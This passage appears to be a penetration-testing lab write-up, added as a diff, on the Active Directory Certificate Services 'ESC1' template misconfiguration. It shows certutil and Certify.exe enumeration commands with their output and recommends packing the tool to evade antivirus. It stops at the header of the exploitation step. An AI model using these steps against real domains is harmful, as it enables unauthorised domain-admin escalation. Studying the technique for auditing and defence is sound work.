@@ -1,0 +1,355 @@
+=======================================================================================================================================
+ADCS Domain Escalation technique "ESC1" - Misconfigured Certificate Templates Allows requesters to specify a SAN
+=======================================================================================================================================
+
+-----------------------------------------------------------------------------------------------
+Explanation / Context - Misconfigured Certificate Templates - ESC1
+-----------------------------------------------------------------------------------------------
+- The Enterprise CA grants low-privileged users enrolment rights
+- Manager approval is disabled
+- No authorized signatures are required
+- An overly permissive certificate template security descriptor grants certificate enrolment rights to low-privileged users
+- The certificate template defines EKUs (Extended/Enhanced Key Usage) that enable authentication such as: Client Authentication or Smart Card Logon or PKINIT Client Authentication ...
+
+- The certificate template allows requesters to specify a subjectAltName (SAN) in the Certificate Signing request (CSR):
+  AD will use the identity specified by a certificate’s subjectAltName (SAN) field if it is present. 
+  Consequently, if a requester can specify the SAN in a CSR, the requester can request a certificate as anyone (e.g., a domain admin user). 
+  The certificate template’s AD object specifies if the requester can specify the SAN in its mspki-certificate-name-flag property. 
+  The mspki-certificate-name-flag property is a bitmask and if the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is present, a requester can specify the SAN.
+
+-----------------------------------------------------------------------------------------------
+Various tools can be used to identify and exploit the ADCS Domain Escalation technique "ESC1"
+-----------------------------------------------------------------------------------------------
+- Certutil (native windows command)
+- Certify (https://github.com/GhostPack/Certify)
+- Certipy.py (https://github.com/ly4k/Certipy)
+- ...
+
+
+=======================================================================================================================================
+PoC - Step 1 - ADCS enumeration using a low privileged domain user and the native windows command 'Certutil' + the C# tool 'Certify.exe'
+=======================================================================================================================================
+
+---------------------------------------------------------------------------------------------------------------------------------------
+1.1 ADCS enumeration with "CERTUTIL"
+---------------------------------------------------------------------------------------------------------------------------------------
+
+You can use certutil to:
+- dump and display certification authority (CA) configuration information, 
+- configure Certificate Services,
+- backup and restore CA components,
+- verify certificates, key pairs, and certificate chains.
+
+
+C:\temp> certutil
+
+Entry 0:
+  Name:                         `company-DC1-CA'
+  Organizational Unit:          `'
+  Organization:                 `'
+  Locality:                     `'
+  State:                        `'
+  Country/region:               `'
+  Config:                       `DC1.company.work\company-DC1-CA'
+  Exchange Certificate:         `'
+  Signature Certificate:        `'
+  Description:                  `'
+  Server:                       `DC1.company.work'
+  Authority:                    `company-DC1-CA'
+  Sanitized Name:               `company-DC1-CA'
+  Short Name:                   `company-DC1-CA'
+  Sanitized Short Name:         `company-DC1-CA'
+  Flags:                        `1'
+  Web Enrollment Servers:       `'
+CertUtil: -dump command completed successfully.
+
+
+
+C:\temp> certutil -TCAinfo
+================================================================
+CA Name: company-DC1-CA
+
+Machine Name: DC1.company.work
+
+DS Location: CN=company-DC1-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=work
+
+Cert DN: CN=company-DC1-CA, DC=company, DC=work
+
+CA Registry Validity Period: 2 Years -- 5/30/2025 1:10 AM
+ NotAfter: 5/30/2028 12:16 AM
+
+Connecting to DC1.company.work\company-DC1-CA ...
+Server could not be reached: The RPC server is unavailable. 0x800706ba (WIN32: 1722 RPC_S_SERVER_UNAVAILABLE) -- (31ms)
+
+
+dwFlags = CA_VERIFY_FLAGS_CONSOLE_TRACE (0x20000000)
+dwFlags = CA_VERIFY_FLAGS_DUMP_CHAIN (0x40000000)
+ChainFlags = CERT_CHAIN_REVOCATION_CHECK_CHAIN_EXCLUDE_ROOT (0x40000000)
+HCCE_LOCAL_MACHINE
+CERT_CHAIN_POLICY_BASE
+-------- CERT_CHAIN_CONTEXT --------
+ChainContext.dwInfoStatus = CERT_TRUST_HAS_PREFERRED_ISSUER (0x100)
+
+SimpleChain.dwInfoStatus = CERT_TRUST_HAS_PREFERRED_ISSUER (0x100)
+
+CertContext[0][0]: dwInfoStatus=10c dwErrorStatus=0
+  Issuer: CN=company-DC1-CA, DC=company, DC=work
+  NotBefore: 5/30/2023 12:06 AM
+  NotAfter: 5/30/2028 12:16 AM
+  Subject: CN=company-DC1-CA, DC=company, DC=work
+  Serial: 338189b187a8c2af4f6b294136fa3b38
+  Cert: 0c1e0b8229adecadcd4699add8637e1710ed1737
+  Element.dwInfoStatus = CERT_TRUST_HAS_NAME_MATCH_ISSUER (0x4)
+  Element.dwInfoStatus = CERT_TRUST_IS_SELF_SIGNED (0x8)
+  Element.dwInfoStatus = CERT_TRUST_HAS_PREFERRED_ISSUER (0x100)
+
+Exclude leaf cert:
+  Chain: da39a3ee5e6b4b0d3255bfef95601890afd80709
+Full chain:
+  Chain: 0c1e0b8229adecadcd4699add8637e1710ed1737
+------------------------------------
+Verified Issuance Policies: All
+Verified Application Policies: All
+
+Supported Certificate Templates:
+Cert Type[0]: User_template (User_template)
+Cert Type[1]: ClientAuth (Authenticated Session)
+Cert Type[2]: DirectoryEmailReplication (Directory Email Replication) -- No Access!
+Cert Type[3]: DomainControllerAuthentication (Domain Controller Authentication) -- No Access!
+Cert Type[4]: KerberosAuthentication (Kerberos Authentication) -- No Access!
+Cert Type[5]: EFSRecovery (EFS Recovery Agent) -- No Access!
+Cert Type[6]: EFS (Basic EFS)
+Cert Type[7]: DomainController (Domain Controller) -- No Access!
+Cert Type[8]: WebServer (Web Server) -- No Access!
+Cert Type[9]: Machine (Computer) -- No Access!
+Cert Type[10]: User (User)
+Cert Type[11]: SubCA (Subordinate Certification Authority) -- No Access!
+Cert Type[12]: Administrator (Administrator) -- No Access!
+Validated Cert Types: 13
+
+================================================================
+DC1.company.work\company-DC1-CA:
+  OFFLINE
+
+CertUtil: -TCAInfo command completed successfully.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------
+1.2 ADCS enumeration with "Certify.exe"
+---------------------------------------------------------------------------------------------------------------------------------------
+
+Github links:
+- https://github.com/GhostPack/Certify
+- https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.0_x64/Certify.exe
+
+Important note => You need to "pack" the binary to avoid AV detection
+  
+The tool allows to:
+-------------------
+- Find information about all registered CAs
+- Find all enabled certificate templates
+- Find vulnerable/abusable certificate templates using default low-privileged groups
+- Find vulnerable/abusable certificate templates using all groups the current user context is a part of
+- Find enabled certificate templates where ENROLLEE_SUPPLIES_SUBJECT is enabled
+- Find enabled certificate templates capable of client authentication
+- Find all enabled certificate templates, display all of their permissions, and don't display the banner message
+- Find all enabled certificate templates and output to a json file
+- Enumerate access control information for PKI objects
+- Request a new certificate using the current user context
+- Request a new certificate using the current machine context
+- Request a new certificate using the current user context but for an alternate name (if supported)
+- Request a new certificate on behalf of another user, using an enrollment agent certificate
+- Download an already requested certificate
+
+
+Command to find information about all registered Certificate Authorities
+-------------------------------------------------------------------------
+ 
+C:\temp>Certifyx64.exe cas /domain:company.work /ldapserver:dc1.company.work /path:CN=Configuration,DC=company,DC=work /showAllPermissions
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate authorities
+[*] Using the search base 'CN=Configuration,DC=company,DC=work'
+
+[*] Root CAs
+
+    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
+    Cert Thumbprint               : 0C1E0B8229ADECADCD4699ADD8637E1710ED1737
+    Cert Serial                   : 338189B187A8C2AF4F6B294136FA3B38
+    Cert Start Date               : 5/30/2023 12:06:51 AM
+    Cert End Date                 : 5/30/2028 12:16:51 AM
+    Cert Chain                    : CN=company-DC1-CA,DC=company,DC=work
+
+[*] NTAuthCertificates - Certificates that enable authentication:
+
+    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
+    Cert Thumbprint               : 0C1E0B8229ADECADCD4699ADD8637E1710ED1737
+    Cert Serial                   : 338189B187A8C2AF4F6B294136FA3B38
+    Cert Start Date               : 5/30/2023 12:06:51 AM
+    Cert End Date                 : 5/30/2028 12:16:51 AM
+    Cert Chain                    : CN=company-DC1-CA,DC=company,DC=work
+
+[*] Enterprise/Enrollment CAs:
+
+    Enterprise CA Name            : company-DC1-CA
+    DNS Hostname                  : DC1.company.work
+    FullName                      : DC1.company.work\company-DC1-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
+    Cert Thumbprint               : 0C1E0B8229ADECADCD4699ADD8637E1710ED1737
+    Cert Serial                   : 338189B187A8C2AF4F6B294136FA3B38
+    Cert Start Date               : 5/30/2023 12:06:51 AM
+    Cert End Date                 : 5/30/2028 12:16:51 AM
+    Cert Chain                    : CN=company-DC1-CA,DC=company,DC=work
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Identity                    : NT AUTHORITY\Authenticated UsersS-1-5-11
+        AccessControlType         : Allow
+        Rights                    : Enroll
+        ObjectType                : 00000000-0000-0000-0000-000000000000
+        IsInherited               : False
+        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
+        InheritanceFlags          : ContainerInherit, ObjectInherit
+        PropagationFlags          : None
+      Identity                    : BUILTIN\Administrators        S-1-5-32-544
+        AccessControlType         : Allow
+        Rights                    : ManageCA, ManageCertificates
+        ObjectType                : 00000000-0000-0000-0000-000000000000
+        IsInherited               : False
+        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
+        InheritanceFlags          : ContainerInherit, ObjectInherit
+        PropagationFlags          : None
+      Identity                    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+        AccessControlType         : Allow
+        Rights                    : ManageCA, ManageCertificates
+        ObjectType                : 00000000-0000-0000-0000-000000000000
+        IsInherited               : False
+        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
+        InheritanceFlags          : ContainerInherit, ObjectInherit
+        PropagationFlags          : None
+      Identity                    : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        AccessControlType         : Allow
+        Rights                    : ManageCA, ManageCertificates
+        ObjectType                : 00000000-0000-0000-0000-000000000000
+        IsInherited               : False
+        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
+        InheritanceFlags          : ContainerInherit, ObjectInherit
+        PropagationFlags          : None
+    Enrollment Agent Restrictions : None
+
+    Enabled Certificate Templates:
+        User_template
+        ClientAuth
+        DirectoryEmailReplication
+        DomainControllerAuthentication
+        KerberosAuthentication
+        EFSRecovery
+        EFS
+        DomainController
+        WebServer
+        Machine
+        User
+        SubCA
+        Administrator
+
+
+=======================================================================================================================================
+PoC 2 - Step 2 - Find vulnerable/abusable certificate templates (ESC1) with the C# tool 'Certify.exe'
+=======================================================================================================================================
+
+Command to find vulnerable/abusable certificate templates using default low-privileged groups
+----------------------------------------------------------------------------------------------
+
+C:\temp>Certifyx64.exe find /vulnerable /domain:company.work /ldapserver:dc1.company.work /path:CN=Configuration,DC=company,DC=work
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=company,DC=work'
+
+[*] Listing info about the Enterprise CA 'company-DC1-CA'
+
+    Enterprise CA Name            : company-DC1-CA
+    DNS Hostname                  : DC1.company.work
+    FullName                      : DC1.company.work\company-DC1-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
+    Cert Thumbprint               : 0C1E0B8229ADECADCD4699ADD8637E1710ED1737
+    Cert Serial                   : 338189B187A8C2AF4F6B294136FA3B38
+    Cert Start Date               : 5/30/2023 12:06:51 AM
+    Cert End Date                 : 5/30/2028 12:16:51 AM
+    Cert Chain                    : CN=company-DC1-CA,DC=company,DC=work
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+      Allow  ManageCA, ManageCertificates               COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : User_template
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, KDC Authentication, Secure Email, Smart Card Logon
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, KDC Authentication, Secure Email, Smart Card Logon
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Domain Users          S-1-5-21-844310393-2305947092-3799914435-513
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+      Object Control Permissions
+        Owner                       : COMPANY\Administrator         S-1-5-21-844310393-2305947092-3799914435-500
+        WriteOwner Principals       : COMPANY\Administrator         S-1-5-21-844310393-2305947092-3799914435-500
+                                      COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Administrator         S-1-5-21-844310393-2305947092-3799914435-500
+                                      COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Administrator         S-1-5-21-844310393-2305947092-3799914435-500
+                                      COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+Certify completed in 00:00:00.1708239
+
+
+=> Conclusion: The "User_template" is prone to the domain privesc vulnerability "ESC1"
+--------------------------------------------------------------------------------------
+The group "COMPANY\Domain Users" can enroll in the template "User_template" which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set.
+This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA).
+
+
+=======================================================================================================================================
+PoC - Step 3 - Exploit the "ESC1" vulnerability to escalate your privileges and become Domain Admin using 'Certify.exe'
+=======================================================================================================================================
+
+
